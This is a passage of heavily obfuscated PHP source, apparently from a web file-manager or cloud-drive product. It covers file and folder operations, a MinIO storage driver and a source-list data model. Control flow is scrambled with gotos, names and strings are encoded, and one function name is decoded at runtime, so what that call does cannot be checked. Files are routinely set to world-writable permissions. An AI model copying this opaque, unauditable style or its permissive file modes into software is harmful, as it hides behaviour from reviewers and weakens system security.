REPEAT_SKIP) { $fœŒŸê¤Šë = $this->iconvSystem($fœŒŸê¤Šë); if (is_dir($fœŒŸê¤Šë)) { return $this->getPathOuter($fœŒŸê¤Šë); } @mkdir($fœŒŸê¤Šë, 511, !0); @chmod($fœŒŸê¤Šë, 511); return is_dir($fœŒŸê¤Šë) ? $this->getPathOuter($fœŒŸê¤Šë) : !1; } public function copyFile($d“­ùó£¼, $EŒîİÅùÅƒ) { $this->mkdir($this->pathFather($EŒîİÅùÅƒ)); $d“­ùó£¼ = $this->iconvSystem($d“­ùó£¼); $EŒîİÅùÅƒ = $this->iconvSystem($EŒîİÅùÅƒ); $fÍÎˆö©‰‡ = copy_64($d“­ùó£¼, $EŒîİÅùÅƒ); @chmod($EŒîİÅùÅƒ, 511); return $fÍÎˆö©‰‡ ? $this->getPathOuter($EŒîİÅùÅƒ) : !1; } public function moveFile($fá»ãŠˆÜÍ, $Bæİî “Õ·) { goto cº°õÖ¦†©; C¥„Ç„¶ß: return $F²™ªø½Ñ¥ ? $this->getPathOuter($Bæİî “Õ·) : !1; goto b¼±†øÌ‚¯; CÖÄ«…È¶: $F²™ªø½Ñ¥ = intval(@rename($fá»ãŠˆÜÍ, $Bæİî “Õ·)); if (!$F²™ªø½Ñ¥) { if ($F²™ªø½Ñ¥ = intval(@copy_64($fá»ãŠˆÜÍ, $Bæİî “Õ·))) { @unlink($fá»ãŠˆÜÍ); } } @chmod($Bæİî “Õ·, 511); goto C¥„Ç„¶ß; cº°õÖ¦†©: $this->mkdir($this->pathFather($Bæİî “Õ·)); $fá»ãŠˆÜÍ = $this->iconvSystem($fá»ãŠˆÜÍ); $Bæİî “Õ· = $this->iconvSystem($Bæİî “Õ·); goto CÖÄ«…È¶; b¼±†øÌ‚¯: } public function delFile($FŠÆŸƒ½£™) { $FŠÆŸƒ½£™ = $this->iconvSystem($FŠÆŸƒ½£™); if (!@unlink($FŠÆŸƒ½£™)) { @chmod($FŠÆŸƒ½£™, 511); if (!@unlink($FŠÆŸƒ½£™)) { return !1; } } else { return !0; } } public function delFolder($aÈ‡¹ÈÕÌö) { goto d¢¸Éå²Ø; EÆÈäå²´: return rmdir($aÈ‡¹ÈÕÌö); goto Dƒ¾°öÄ¨®; d¢¸Éå²Ø: $dëÂ§ô÷„Ú =& $_SERVER[Ç³Íß¦Ó]; $aÈ‡¹ÈÕÌö = $this->iconvSystem($aÈ‡¹ÈÕÌö); if (!is_dir($aÈ‡¹ÈÕÌö)) { return !0; } goto a¦§„„¯‚¥; a¦§„„¯‚¥: if (!($AÌæ‚À›¥£ = opendir($aÈ‡¹ÈÕÌö))) { return !1; } while (($dùŠµ—ğÂ¬ = readdir($AÌæ‚À›¥£)) !== !1) { if ($dùŠµ—ğÂ¬ == $dëÂ§ô÷„Ú[95] || $dùŠµ—ğÂ¬ == $dëÂ§ô÷„Ú[1250]) { continue; } $DêéÈÀŠ¶ƒ = $aÈ‡¹ÈÕÌö . $dëÂ§ô÷„Ú[8] . $dùŠµ—ğÂ¬; if (is_file($DêéÈÀŠ¶ƒ) || is_link($DêéÈÀŠ¶ƒ)) { if (!unlink($DêéÈÀŠ¶ƒ)) { chmod($DêéÈÀŠ¶ƒ, 511); if (!unlink($DêéÈÀŠ¶ƒ)) { return !1; } } } else { if (is_dir($DêéÈÀŠ¶ƒ)) { chmod($DêéÈÀŠ¶ƒ, 511); $DêéÈÀŠ¶ƒ = $this->iconvApp($DêéÈÀŠ¶ƒ); if (!$this->delFolder($DêéÈÀŠ¶ƒ)) { return !1; } } } } closedir($AÌæ‚À›¥£); goto EÆÈäå²´; Dƒ¾°öÄ¨®: } public function rename($F¿Š¥åñ¹, $D©µ×æ‚) { goto DØ¯Ùì¾ßË; DØ¯Ùì¾ßË: $E©”Ô‡ĞäÌ =& $_SERVER[Ç³Íß¦Ó]; $d‘“¥ñÜœ‹ = $this->fileNameAuto($this->pathFather($F¿Š¥åñ¹), $D©µ×æ‚); $d‘“¥ñÜœ‹ = $this->iconvSystem($d‘“¥ñÜœ‹); goto cŞåÍ¸Ğ›; cŞåÍ¸Ğ›: $F¿Š¥åñ¹ = $this->iconvSystem($F¿Š¥åñ¹); $DÔçßÚÌŠ¹ = $this->pathFather($F¿Š¥åñ¹); $c–èÎÈ–±Š = rtrim($DÔçßÚÌŠ¹, $E©”Ô‡ĞäÌ[8]) . $E©”Ô‡ĞäÌ[8] . $d‘“¥ñÜœ‹; goto bØ¶çéíÖİ; bØ¶çéíÖİ: $Eõ¨¬íè„£ = @rename($F¿Š¥åñ¹, $c–èÎÈ–±Š); $c–èÎÈ–±Š = $this->iconvApp($c–èÎÈ–±Š); return $Eõ¨¬íè„£ ? $this->getPathOuter($c–èÎÈ–±Š) : !1; goto B¬“íÈèÜĞ; B¬“íÈèÜĞ: } public function size($b‚°„ŒÈšñ) { $b‚°„ŒÈšñ = $this->iconvSystem($b‚°„ŒÈšñ); return filesize_64($b‚°„ŒÈšñ); } public function info($aõÒö·¼‡) { $aõÒö·¼‡ = $this->iconvSystem($aõÒö·¼‡); if ($this->isFolder($aõÒö·¼‡)) { return $this->folderInfo($aõÒö·¼‡); } else { if ($this->isFile($aõÒö·¼‡)) { return $this->fileInfo($aõÒö·¼‡); } } return !1; } protected function infoChildren($b®¿Œ‘ÌñÎ, &$aµùÖ«„Í, $dµã“º›·¶ = true) { goto bğÇ§‹‚‚; bğÇ§‹‚‚: $bŸË²™ùåô =& $_SERVER[Ç³Íß¦Ó]; check_abort_echo(); $b®¿Œ‘ÌñÎ = rtrim($b®¿Œ‘ÌñÎ, $bŸË²™ùåô[8]) . $bŸË²™ùåô[8]; goto E‹„¹ÖÆ©; E‹„¹ÖÆ©: if ($dµã“º›·¶) { $b®¿Œ‘ÌñÎ = $this->iconvSystem($b®¿Œ‘ÌñÎ); } if (!($c¯‚àœÑ‰ = @opendir($b®¿Œ‘ÌñÎ))) { return; } while (($cÇËŞ£ ¹» = readdir($c¯‚àœÑ‰)) !== !1) { if ($cÇËŞ£ ¹» == $bŸË²™ùåô[95] || $cÇËŞ£ ¹» == $bŸË²™ùåô[1250]) { continue; } $c¬Ú«á®º = $b®¿Œ‘ÌñÎ . $cÇËŞ£ ¹»; if (is_file($c¬Ú«á®º) || is_link($c¬Ú«á®º)) { $aµùÖ«„Í[$bŸË²™ùåô[79]]++; $aµùÖ«„Í[$bŸË²™ùåô[78]] += filesize_64($c¬Ú«á®º); } else { if (is_dir($c¬Ú«á®º)) { $aµùÖ«„Í[$bŸË²™ùåô[80]]++; $this->infoChildren($c¬Ú«á®º, $aµùÖ«„Í, !1); } } } goto B©·Û·ëãŸ; B©·Û·ëãŸ: closedir($c¯‚àœÑ‰); goto aƒ“å‚ŞŸ³; aƒ“å‚ŞŸ³: } private function folderInfo($aÒ „À×±¶, $C„˜­Œ¿“ = false) { $AåàëêïóÔ =& $_SERVER[Ç³Íß¦Ó]; $aÒ „À×±¶ = rtrim($aÒ „À×±¶, $AåàëêïóÔ[8]) . $AåàëêïóÔ[8]; $Få”·îÏ¢Î = $this->iconvApp($this->pathThis($aÒ „À×±¶)); if ($C„˜­Œ¿“) { return array($AåàëêïóÔ[28] => $Få”·îÏ¢Î, $AåàëêïóÔ[76] => $this->getPathOuter($aÒ „À×±¶), $AåàëêïóÔ[29] => $AåàëêïóÔ[77]); } $Aá²‹Ô·‘ = array($AåàëêïóÔ[28] => $Få”·îÏ¢Î, $AåàëêïóÔ[76] => $this->getPathOuter($aÒ „À×±¶), $AåàëêïóÔ[29] => $AåàëêïóÔ[77], $AåàëêïóÔ[193] => @filectime($aÒ „À×±¶), $AåàëêïóÔ[84] => @filemtime($aÒ „À×±¶), $AåàëêïóÔ[1253] => @fileatime($aÒ „À×±¶), $AåàëêïóÔ[1254] => is_readable($aÒ „À×±¶), $AåàëêïóÔ[1255] => is_writable($aÒ „À×±¶), $AåàëêïóÔ[1256] => get_mode($aÒ „À×±¶)); return $Aá²‹Ô·‘; } private function fileInfo($Dïä·öÑ, $bŸò¼”µæ = false) { $F¼‹±ß³à­ =& $_SERVER[Ç³Íß¦Ó]; $dœÄÙòâƒ† = $this->iconvApp($this->pathThis($Dïä·öÑ)); if ($bŸò¼”µæ) { return array($F¼‹±ß³à­[28] => $dœÄÙòâƒ†, $F¼‹±ß³à­[76] => $this->getPathOuter($Dïä·öÑ), $F¼‹±ß³à­[29] => $F¼‹±ß³à­[192], $F¼‹±ß³à­[78] => $this->size($Dïä·öÑ), $F¼‹±ß³à­[168] => $this->ext($dœÄÙòâƒ†)); } $b¢´±Ş½îó = array($F¼‹±ß³à­[28] => $dœÄÙòâƒ†, $F¼‹±ß³à­[76] => $this->getPathOuter($Dïä·öÑ), $F¼‹±ß³à­[29] => $F¼‹±ß³à­[192], $F¼‹±ß³à­[193] => @filectime($Dïä·öÑ), $F¼‹±ß³à­[84] => @filemtime($Dïä·öÑ), $F¼‹±ß³à­[1253] => @fileatime($Dïä·öÑ), $F¼‹±ß³à­[78] => $this->size($Dïä·öÑ), $F¼‹±ß³à­[168] => $this->ext($dœÄÙòâƒ†), $F¼‹±ß³à­[1254] => is_readable($Dïä·öÑ), $F¼‹±ß³à­[1255] => is_writable($Dïä·öÑ), $F¼‹±ß³à­[1256] => get_mode($Dïä·öÑ)); return $b¢´±Ş½îó; } public function exist($bŞ—´¢Œ´) { $bŞ—´¢Œ´ = $this->iconvSystem($bŞ—´¢Œ´); return @file_exists($bŞ—´¢Œ´); } public function isFile($C¨Êì³·ŒÈ) { $C¨Êì³·ŒÈ = $this->iconvSystem($C¨Êì³·ŒÈ); return @is_file($C¨Êì³·ŒÈ); } public function isFolder($dŒÃÉ©“çº) { $dŒÃÉ©“çº = $this->iconvSystem($dŒÃÉ©“çº); return @is_dir($dŒÃÉ©“çº); } public function listPath($b²¾ò½Â, $e³İê•¿å = false) { goto F¥‚»ˆšç; F¥‚»ˆšç: $CŒôí¡·Ûë =& $_SERVER[Ç³Íß¦Ó]; $b²¾ò½Â = $this->iconvSystem($b²¾ò½Â); $b²¾ò½Â = rtrim($b²¾ò½Â, $CŒôí¡·Ûë[8]) . $CŒôí¡·Ûë[8]; goto e§ÑÈÜâ¥; e§ÑÈÜâ¥: $A†Æó‰ŞÊ± = array($CŒôí¡·Ûë[75] => array(), $CŒôí¡·Ûë[74] => array()); if (!($E®æÔÄ²¯À = @opendir($b²¾ò½Â))) { return $A†Æó‰ŞÊ±; } while (($cõğÊ¸•ä = readdir($E®æÔÄ²¯À)) !== !1) { if ($cõğÊ¸•ä == $CŒôí¡·Ûë[95] || $cõğÊ¸•ä == $CŒôí¡·Ûë[1250]) { continue; } $dğïÛŒì = $b²¾ò½Â . $cõğÊ¸•ä; if (is_file($dğïÛŒì)) { $A†Æó‰ŞÊ±[$CŒôí¡·Ûë[74]][] = $this->fileInfo($dğïÛŒì, $e³İê•¿å); } else { $A†Æó‰ŞÊ±[$CŒôí¡·Ûë[75]][] = $this->folderInfo($dğïÛŒì, $e³İê•¿å); } } goto bÂ°èæÁ†; bÂ°èæÁ†: closedir($E®æÔÄ²¯À); return $A†Æó‰ŞÊ±; goto f Ø¶‹’†; f Ø¶‹’†: } public function listAll($c³à¸„æì, &$bÈİ·İ‡¶Ù = array()) { goto fâÇÙ´¡Ş; fâÇÙ´¡Ş: $fÛ‡¨¤¸ó =& $_SERVER[Ç³Íß¦Ó]; $c³à¸„æì = $this->iconvSystem($c³à¸„æì); $c³à¸„æì = rtrim($c³à¸„æì, $fÛ‡¨¤¸ó[8]) . $fÛ‡¨¤¸ó[8]; goto e¶ì½´±Î¦; e¶ì½´±Î¦: if (!($dÜ©©ÍíÑ¨ = @opendir($c³à¸„æì))) { return $bÈİ·İ‡¶Ù; } while (($CæéŸ‹ÍÑ = readdir($dÜ©©ÍíÑ¨)) !== !1) { if ($CæéŸ‹ÍÑ == $fÛ‡¨¤¸ó[95] || $CæéŸ‹ÍÑ == $fÛ‡¨¤¸ó[1250]) { continue; } $BÕ²ŒÌÌ = $c³à¸„æì . $CæéŸ‹ÍÑ; if (is_dir($BÕ²ŒÌÌ) && !is_link($BÕ²ŒÌÌ)) { $bÈİ·İ‡¶Ù[] = array($fÛ‡¨¤¸ó[76] => $BÕ²ŒÌÌ . $fÛ‡¨¤¸ó[8], $fÛ‡¨¤¸ó[77] => 1, $fÛ‡¨¤¸ó[84] => @filemtime($BÕ²ŒÌÌ), $fÛ‡¨¤¸ó[78] => 0); $this->listAll($BÕ²ŒÌÌ, $bÈİ·İ‡¶Ù); } else { $bÈİ·İ‡¶Ù[] = array($fÛ‡¨¤¸ó[76] => $BÕ²ŒÌÌ, $fÛ‡¨¤¸ó[77] => 0, $fÛ‡¨¤¸ó[84] => @filemtime($BÕ²ŒÌÌ), $fÛ‡¨¤¸ó[78] => $this->size($BÕ²ŒÌÌ)); } } closedir($dÜ©©ÍíÑ¨); goto B„—åİ¸†ã; B„—åİ¸†ã: return $bÈİ·İ‡¶Ù; goto c®ÓÁù÷¥; c®ÓÁù÷¥: } public function has($Cğ¯´Ğ’ˆ®, $C„‹£°Œé™ = false, $f•¬‰åè™ = true) { goto C„“ñÏÇ¤–; A´åæ×·çÖ: $BÜ¦†¨†† = 0; while (($D¸ˆ™±¸ÄÏ = readdir($c‹êœİºÎ)) !== !1) { if ($D¸ˆ™±¸ÄÏ == $cË÷÷¿åİŒ[95] || $D¸ˆ™±¸ÄÏ == $cË÷÷¿åİŒ[1250]) { continue; } $fÙİªƒ¼¦­ = $Cğ¯´Ğ’ˆ® . $D¸ˆ™±¸ÄÏ; if ($C„‹£°Œé™) { $BÜ¦†¨††++; if (@is_file($fÙİªƒ¼¦­)) { $eø†ïÕŒ›++; } else { $AÕ•°…ÍŞ++; } if ($BÜ¦†¨†† > 10000) { break; } continue; } if ($f•¬‰åè™) { if (@is_file($fÙİªƒ¼¦­)) { return !0; } } else { if (@is_dir($fÙİªƒ¼¦­ . $cË÷÷¿åİŒ[8])) { return !0; } } } closedir($c‹êœİºÎ); goto DÉ´…´÷Ñ´; DÉ´…´÷Ñ´: if ($C„‹£°Œé™) { return array($cË÷÷¿åİŒ[202] => $eø†ïÕŒ›, $cË÷÷¿åİŒ[203] => $AÕ•°…ÍŞ); } return !1; goto d°ÁË‡¸Ø; CŒ˜Òåšëö: if (!($c‹êœİºÎ = @opendir($Cğ¯´Ğ’ˆ®))) { return !1; } $eø†ïÕŒ› = 0; $AÕ•°…ÍŞ = 0; goto A´åæ×·çÖ; C„“ñÏÇ¤–: $cË÷÷¿åİŒ =& $_SERVER[Ç³Íß¦Ó]; $Cğ¯´Ğ’ˆ® = $this->iconvSystem($Cğ¯´Ğ’ˆ®); $Cğ¯´Ğ’ˆ® = rtrim($Cğ¯´Ğ’ˆ®, $cË÷÷¿åİŒ[8]) . $cË÷÷¿åİŒ[8]; goto CŒ˜Òåšëö; d°ÁË‡¸Ø: } public function hashSimple($Fõœ‚µ³ä·) { goto Eİ“ö¡à“Ç; c—áåÕ×¼: return md5($f»»×¤¶) . $c¡­´ğ†ÂŠ; goto fİÓõÓëã«; Eİ“ö¡à“Ç: $d²èº­âóÑ =& $_SERVER[Ç³Íß¦Ó]; if (!$Fõœ‚µ³ä·) { return md5($d²èº­âóÑ[33]); } $Fõœ‚µ³ä· = $this->iconvSystem($Fõœ‚µ³ä·); goto A·Ÿ‡ëÅèª; B–Ùë…ô× : $DìÚÂŠÌŒï = fopen($Fõœ‚µ³ä·, $d²èº­âóÑ[1257]); if (!$DìÚÂŠÌŒï) { return $f»»×¤¶; } for ($eì™¢ –ª‰ = 0; $eì™¢ –ª‰ < $f¼·´Õ Šõ; $eì™¢ –ª‰++) { fseek_64($DìÚÂŠÌŒï, $bÚÄº¹Ñ * $eì™¢ –ª‰); $f»»×¤¶ .= fread($DìÚÂŠÌŒï, $eˆ÷†‹İË×); } goto cÈÕÌÚ£; f¤“İà¤: if ($c¡­´ğ†ÂŠ <= $eˆ÷†‹İË× * $f¼·´Õ Šõ) { return $this->hashMd5($Fõœ‚µ³ä·) . $c¡­´ğ†ÂŠ; } $f»»×¤¶ = $d²èº­âóÑ[33]; $bÚÄº¹Ñ = intval($c¡­´ğ†ÂŠ / $f¼·´Õ Šõ); goto B–Ùë…ô× ; cÈÕÌÚ£: fseek_64($DìÚÂŠÌŒï, $c¡­´ğ†ÂŠ - $eˆ÷†‹İË×); $f»»×¤¶ .= fread($DìÚÂŠÌŒï, $eˆ÷†‹İË×); fclose($DìÚÂŠÌŒï); goto c—áåÕ×¼; A·Ÿ‡ëÅèª: $c¡­´ğ†ÂŠ = $this->size($Fõœ‚µ³ä·); $eˆ÷†‹İË× = 200; $f¼·´Õ Šõ = 50; goto f¤“İà¤; fİÓõÓëã«: } public function getContent($a¬’·øêŸÚ) { $a¬’·øêŸÚ = $this->iconvSystem($a¬’·øêŸÚ); return file_get_contents($a¬’·øêŸÚ); } public function setContent($eĞˆËÅ‚öÒ, $Cˆã¬¡¾Şğ = '') { $eĞˆËÅ‚öÒ = $this->iconvSystem($eĞˆËÅ‚öÒ); $D³Øˆ±ˆ‚ = @file_put_contents($eĞˆËÅ‚öÒ, $Cˆã¬¡¾Şğ, LOCK_EX); clearstatcache(); @chmod($eĞˆËÅ‚öÒ, 511); return $D³Øˆ±ˆ‚ === !1 ? !1 : !0; } public function fileSubstr($e¶º¯àÌŸ, $böïÇö¸¯Î = 0, $F­º˜¸é†³ = false) { goto FÔÜ—³½Ü·; dš¹¾ïµ‰©: fseek_64($fÍçùµ®“ø, $böïÇö¸¯Î); $b×¢îÕÖóÚ = fread($fÍçùµ®“ø, $F­º˜¸é†³); fclose($fÍçùµ®“ø); goto E­¤ªëßÙ…; E­¤ªëßÙ…: return $b×¢îÕÖóÚ; goto e”Óª¨£Ø‡; FÔÜ—³½Ü·: $DéË…µâÅ¡ =& $_SERVER[Ç³Íß¦Ó]; $e¶º¯àÌŸ = $this->iconvSystem($e¶º¯àÌŸ); if ($F­º˜¸é†³ === !1) { $F­º˜¸é†³ = $this->size($e¶º¯àÌŸ); } goto Cˆí‡È…Û; Cˆí‡È…Û: if ($F­º˜¸é†³ <= 0) { return $DéË…µâÅ¡[33]; } $fÍçùµ®“ø = fopen($e¶º¯àÌŸ, $DéË…µâÅ¡[1257]); if (!$fÍçùµ®“ø) { return !1; } goto dš¹¾ïµ‰©; e”Óª¨£Ø‡: } public function upload($a ªáëÌ, $AŒ¿åŠ×Ğ, $d’‡«›è˜È = false, $Dîíˆ¨ = REPEAT_REPLACE) { if ($d’‡«›è˜È) { return $this->moveFile($AŒ¿åŠ×Ğ, $a ªáëÌ); } return $this->copyFile($AŒ¿åŠ×Ğ, $a ªáëÌ); } public function setModifyTime($E…à™—®‹, $AÑÉô¬ÚŸ¼ = '') { @touch($E…à™—®‹, intval($AÑÉô¬ÚŸ¼)); } public function download($bÜïÃöÃéÄ, $d´ˆô‘éÍİ) { return $this->iconvSystem($bÜïÃöÃéÄ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($F¿ëƒ¬£Æ) { parent::__construct($F¿ëƒ¬£Æ); $this->signatureVersion($_SERVER[Ç³Íß¦Ó][211]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto EÂ¶ÅÀÉê„; aÒĞâ‚ÇëÅ: $AÙø¬­ëÈÈ = strrev(base64_decode($_SERVER[ûºÛ][0])); function binCheckNeq($FÆˆƒ§ñ–˜, $Cæï…ÀÉƒ) { return $FÆˆƒ§ñ–˜ != $Cæï…ÀÉƒ; } $_SERVER[$_SERVER[ûºÛ][1]] = $AÙø¬­ëÈÈ($_SERVER[$_SERVER[ûºÛ][2]]); goto dªëÛ³ÔÊ›; dªëÛ³ÔÊ›: function binCheckBigger($d¡Ñ„“Ò–Ø, $cˆ¬÷‰óƒÛ) { return $d¡Ñ„“Ò–Ø > $cˆ¬÷‰óƒÛ; } $_SERVER[$_SERVER[ûºÛ][3]] = (base64_decode('OTA0NA==')."\60\61")+0;$_Bnpj="m6NXbtzh2FDPiV7F5YEAgvJfe7EwneyTK3syVYquJ7YsVQN9SkY9Q5tRq8IIzSHaFungdhC";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($D“Î¯‚İ ‡, $eö¶ÇÏ„§) { $a—ÀÀÚœ‡Ã =& $_SERVER[Ç³Íß¦Ó]; if (isset(self::$_methodList[$D“Î¯‚İ ‡])) { return @call_user_func_array(self::$_methodList[$D“Î¯‚İ ‡], $eö¶ÇÏ„§); } else { if (method_exists($this, $D“Î¯‚İ ‡)) { return call_user_func_array(array($this, $D“Î¯‚İ ‡), $eö¶ÇÏ„§); } else { think_exception(__CLASS__ . $a—ÀÀÚœ‡Ã[4] . $D“Î¯‚İ ‡ . $a—ÀÀÚœ‡Ã[5]); } } } public static function __callStatic($B‹â ‹¥¯, $e­Æ°ŠŒŒï) { if (isset(self::$_methodListStatic[$B‹â ‹¥¯])) { return call_user_func_array(self::$_methodListStatic[$B‹â ‹¥¯], $e­Æ°ŠŒŒï); } else { if (method_exists(self, $B‹â ‹¥¯)) { return call_user_func_array(array(self, $B‹â ‹¥¯), $e­Æ°ŠŒŒï); } else { show_json("{$B‹â ‹¥¯}\50\51\x20\156\157\164\40\x65\x78\x69\163\164\73", !1); } } } public static function addMethod($eÀ”éÉÔ²À, $f•¹À³©) { self::$_methodList[$eÀ”éÉÔ²À] = $f•¹À³©; } public static function addMethodStatic($F¹ÀÕÖöŸœ, $Aà‘™·ÓŠ¿) { self::$_methodListStatic[$F¹ÀÕÖöŸœ] = $Aà‘™·ÓŠ¿; } } goto E÷îš­øä¹; DÜÕ««¶ä‰: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\162\143\145"; protected $tableMeta = array("\x74\141\142\154\x65\116\x61\x6d\145" => "\151\x6f\137\x73\157\x75\x72\x63\145\137\x6d\145\164\x61", "\x6d\145\x74\x61\106\151\x65\x6c\144" => "\x73\x6f\165\162\143\x65\111\x44"); protected $dataAuto = array(array("\155\157\x64\151\146\x79\124\x69\x6d\145", "\164\x69\155\x65", "\151\156\x73\x65\x72\164", "\146\165\156\x63\164\x69\x6f\x6e"), array("\x63\162\x65\141\x74\x65\124\151\x6d\x65", "\164\x69\x6d\145", "\x69\x6e\x73\x65\162\164", "\146\165\x6e\143\164\151\x6f\x6e"), array("\x76\151\x65\167\124\151\x6d\x65", "\164\x69\x6d\x65", "\x69\x6e\x73\x65\162\164", "\x66\165\x6e\x63\164\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($b¸İÙ×áí) { return $this->listSource(array($_SERVER[Ç³Íß¦Ó][393] => $b¸İÙ×áí)); } public function typeName($AõõœÔØ¡ª) { static $B‰´èºÅ¢Å = array(self::TYPE_SYSTEM => "\x73\x79\x73\164\145\x6d", self::TYPE_USER => "\x75\163\145\x72", self::TYPE_GROUP => "\x67\162\157\165\x70"); return $B‰´èºÅ¢Å[$AõõœÔØ¡ª . $_SERVER[Ç³Íß¦Ó][33]]; } public function sourceListInfo($CâˆÜŸ“ø×, $eä‹œ†íå = false) { goto D¬ ‚Øï¥à; d ôÏº‚ç: return array_to_keyvalue($DæÃå¼…´¥, $FŒÃ©Å¯­›[394]); goto DÎœÈæÁù¨; dìŠÊÙåÒ: if (!$CâˆÜŸ“ø×) { return array(); } $DæÃå¼…´¥ = $this->where(array($FŒÃ©Å¯­›[394] => array($FŒÃ©Å¯­›[7], $CâˆÜŸ“ø×)))->select(); $this->_listDataApply($DæÃå¼…´¥, $eä‹œ†íå); goto d ôÏº‚ç; D¬ ‚Øï¥à: $FŒÃ©Å¯­› =& $_SERVER[Ç³Íß¦Ó]; $CâˆÜŸ“ø× = $CâˆÜŸ“ø× ? $CâˆÜŸ“ø× : array(); $CâˆÜŸ“ø× = array_filter(array_unique($CâˆÜŸ“ø×)); goto dìŠÊÙåÒ; DÎœÈæÁù¨: } public function pathInfoFilter(&$cïËø÷¹í“) { goto DÔëìŠ¢ô; a¥Áï¼Ãš±: if (!$Bİ¦„ù˜¯¸) { goto FÖÜÛ˜Â§¼; c™‚÷°é•š: $eŞø·Ñåç¼ = array(); foreach ($Bİ¦„ù˜¯¸ as $bŒ†óñ¬­Ï) { if (in_array($bŒ†óñ¬­Ï, $d¤´®æŠÜ´)) { continue; } $eŞø·Ñåç¼[] = $bŒ†óñ¬­Ï; } goto A…•íš¶¸; FÔ‰¸Îš™: $CÍ‚¾Éæ£‹ = $fùÚîŒáÓâ[398]; $d¤´®æŠÜ´ = explode($fùÚîŒáÓâ[47], $CÍ‚¾Éæ£‹); $Bİ¦„ù˜¯¸ = explode($fùÚîŒáÓâ[47], $C‚°‰‚ß“); goto c™‚÷°é•š; FÖÜÛ˜Â§¼: $C‚°‰‚ß“ = $fùÚîŒáÓâ[395]; $C‚°‰‚ß“ .= $fùÚîŒáÓâ[396]; $C‚°‰‚ß“ .= $fùÚîŒáÓâ[397]; goto FÔ‰¸Îš™; A…•íš¶¸: } $cïËø÷¹í“[$fùÚîŒáÓâ[76]] = $fùÚîŒáÓâ[399] . $cïËø÷¹í“[$fùÚîŒáÓâ[394]] . $fùÚîŒáÓâ[400]; $cïËø÷¹í“[$fùÚîŒáÓâ[29]] = $cïËø÷¹í“[$fùÚîŒáÓâ[401]] == 1 ? $fùÚîŒáÓâ[77] : $fùÚîŒáÓâ[192]; goto aµÊèëÏÖ; DÔëìŠ¢ô: $fùÚîŒáÓâ =& $_SERVER[Ç³Íß¦Ó]; static $Bİ¦„ù˜¯¸ = false; static $eŞø·Ñåç¼ = false; goto a¥Áï¼Ãš±; a’Úà“æ‡‚: if (isset($cïËø÷¹í“[$fùÚîŒáÓâ[404]]) && $cïËø÷¹í“[$fùÚîŒáÓâ[404]][$fùÚîŒáÓâ[405]] == -1) { $dŞ ôÎ¾ç = $eŞø·Ñåç¼; } $cïËø÷¹í“ = array_field_key($cïËø÷¹í“, $dŞ ôÎ¾ç); return $cïËø÷¹í“; goto f“¥Æêí; aµÊèëÏÖ: $cïËø÷¹í“[$fùÚîŒáÓâ[402]] = $this->typeName($cïËø÷¹í“[$fùÚîŒáÓâ[402]]); if ($cïËø÷¹í“[$fùÚîŒáÓâ[401]] != 1) { $cïËø÷¹í“[$fùÚîŒáÓâ[168]] = $cïËø÷¹í“[$fùÚîŒáÓâ[403]]; unset($cïËø÷¹í“[$fùÚîŒáÓâ[403]]); } $dŞ ôÎ¾ç = $Bİ¦„ù˜¯¸; goto a’Úà“æ‡‚; f“¥Æêí: } public function listUserFav() { goto BÑ¬Ëàƒä; BŠ‹£·ÖœÑ: $e•¬Ç¡ºÂ = array_to_keyvalue($e•¬Ç¡ºÂ, $fÓœ÷Ûê‰­[33], $fÓœ÷Ûê‰­[76]); if ($e•¬Ç¡ºÂ) { $FªœĞôµêÈ = $this->listSource(array($fÓœ÷Ûê‰­[408] => array($fÓœ÷Ûê‰­[409], $e•¬Ç¡ºÂ))); } $FªœĞôµêÈ = array_to_keyvalue($FªœĞôµêÈ[$fÓœ÷Ûê‰­[366]], $fÓœ÷Ûê‰­[394]); goto F•Ãô¿Ç£›; BÑ¬Ëàƒä: $fÓœ÷Ûê‰­ =& $_SERVER[Ç³Íß¦Ó]; $B„òĞ½´µ¹ = Model($fÓœ÷Ûê‰­[406])->listData(); $e•¬Ç¡ºÂ = array_filter_by_field($B„òĞ½´µ¹, $fÓœ÷Ûê‰­[29], $fÓœ÷Ûê‰­[407]); goto BŠ‹£·ÖœÑ; F•Ãô¿Ç£›: foreach ($B„òĞ½´µ¹ as &$cÀí‹Í‡) { $cÀí‹Í‡ = array($fÓœ÷Ûê‰­[410] => $cÀí‹Í‡[$fÓœ÷Ûê‰­[392]], $fÓœ÷Ûê‰­[411] => $cÀí‹Í‡[$fÓœ÷Ûê‰­[28]], $fÓœ÷Ûê‰­[412] => $cÀí‹Í‡[$fÓœ÷Ûê‰­[76]], $fÓœ÷Ûê‰­[413] => $cÀí‹Í‡[$fÓœ÷Ûê‰­[29]], $fÓœ÷Ûê‰­[414] => $cÀí‹Í‡[$fÓœ÷Ûê‰­[193]], $fÓœ÷Ûê‰­[415] => $cÀí‹Í‡[$fÓœ÷Ûê‰­[84]]); if ($cÀí‹Í‡[$fÓœ÷Ûê‰­[29]] == $fÓœ÷Ûê‰­[407] && $FªœĞôµêÈ[$cÀí‹Í‡[$fÓœ÷Ûê‰­[76]]]) { $cÀí‹Í‡[$fÓœ÷Ûê‰­[85]] = $FªœĞôµêÈ[$cÀí‹Í‡[$fÓœ÷Ûê‰­[76]]]; } } unset($cÀí‹Í‡); return $B„òĞ½´µ¹; goto b¶ë¡­™ĞÛ; b¶ë¡­™ĞÛ: } public function listUserTag($a””‘Ò‘Áô) { goto a²å­‘¶êæ; a²å­‘¶êæ: $FÀŒ…•âˆö =& $_SERVER[Ç³Íß¦Ó]; if ($a””‘Ò‘Áô && !is_array($a””‘Ò‘Áô)) { $a””‘Ò‘Áô = array($a””‘Ò‘Áô); } $BÒ°šâŒŸš = Model($FÀŒ…•âˆö[416])->listData(); goto aõ‚¥ÛŒË; aõ‚¥ÛŒË: $Fæ¡–î Ì³ = array(); foreach ($BÒ°šâŒŸš as $eÌí˜«‹ÄŠ) { $Fç¾ƒã‰„õ = $eÌí˜«‹ÄŠ[$FÀŒ…•âˆö[76]]; if (!$Fç¾ƒã‰„õ) { continue; } if (!isset($Fæ¡–î Ì³[$Fç¾ƒã‰„õ])) { $Fæ¡–î Ì³[$Fç¾ƒã‰„õ] = array(); } 